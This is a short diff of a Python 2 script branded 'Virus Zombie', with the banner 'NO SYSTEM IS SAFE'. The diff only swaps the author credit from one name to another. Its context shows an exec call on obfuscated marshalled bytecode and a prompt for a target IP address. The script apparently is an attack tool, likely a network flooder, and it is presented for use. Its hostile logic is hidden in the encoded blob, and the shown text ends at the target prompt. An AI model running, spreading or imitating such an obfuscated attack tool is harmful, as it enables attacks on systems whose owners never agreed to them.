@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # Life Of Programmer
-# Coded by The Sixty Nine
+# Coded by Nedi Senja
 
 import os, sys, time, random, socket, string, marshal
 
@@ -33,7 +33,7 @@ exec(marshal.loads("c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x
 
 print logo
 
-print(" \033[0m[\033[92;1m#\033[0m] \033[77;1mVirus Zombie, \033[4mCoded by The Sixty Nine")
+print(" \033[0m[\033[92;1m#\033[0m] \033[77;1mVirus Zombie, \033[4mCoded by Nedi Senja")
 print(" \033[0m[\033[93;1m*\033[0m] \033[77;1;3mNO SYSTEM IS SAFE \033[0m\033[77m ")
 print("")
 ip = raw_input(" \033[0m[\033[94;1m+\033[0m] IP Target \033[77;1m: ")
